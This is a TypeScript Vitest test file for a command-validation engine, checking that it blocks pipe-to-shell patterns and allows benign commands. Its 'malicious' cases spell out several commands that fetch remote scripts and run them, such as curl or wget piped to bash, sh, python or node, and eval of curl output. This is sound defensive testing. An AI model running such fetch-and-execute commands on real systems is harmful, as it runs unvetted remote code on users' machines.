import { describe, it, expect } from 'vitest';
import { validate } from '../../src/engine';

const expectFinding = (input: string, ruleSubstring: string) => {
  const v = validate(input);
  expect(v.severity, `expected block for: ${input}`).toBe('block');
  expect(v.findings.some((f) => f.ruleId.includes(ruleSubstring))).toBe(true);
};

describe('pipe-to-shell', () => {
  describe('malicious', () => {
    it('flags curl piped to bash', () => {
      expectFinding('curl -fsSL https://get.example.com/install.sh | bash', 'pipe_to_shell');
    });

    it('flags wget piped to sh', () => {
      expectFinding('wget -qO- https://example.com/x | sh', 'pipe_to_shell');
    });

    it('flags curl piped to python with -c equivalent', () => {
      expectFinding('curl https://example.com/x.py | python', 'pipe_to_shell');
    });

    it('flags process substitution with curl', () => {
      expectFinding('bash <(curl -fsSL https://example.com/install.sh)', 'pipe_to_shell');
    });

    it('flags wget piped through tee to sh', () => {
      expectFinding('wget -qO- https://example.com/x | tee /tmp/x | sh', 'pipe_to_shell');
    });

    it('flags eval $(curl ...)', () => {
      expectFinding('eval "$(curl -s https://example.com/x)"', 'pipe_to_shell');
    });

    it('flags fetch piped to node', () => {
      expectFinding('curl -sL https://example.com/x.js | node', 'pipe_to_shell');
    });
  });

  describe('benign', () => {
    it('does not flag curl alone (no pipe)', () => {
      const v = validate('curl https://example.com/x.html -o page.html');
      expect(v.severity).toBe('allow');
    });

    it('does not flag pipe to non-interpreter (less, tee, jq)', () => {
      const v = validate('curl -s https://example.com/api | jq .');
      expect(v.severity).toBe('allow');
    });

    it('does not flag plain ls', () => {
      const v = validate('ls -la');
      expect(v.severity).toBe('allow');
    });

    it('does not flag wget with -O flag (saving to file)', () => {
      const v = validate('wget -O install.sh https://example.com/install.sh');
      expect(v.severity).toBe('allow');
    });
  });
});
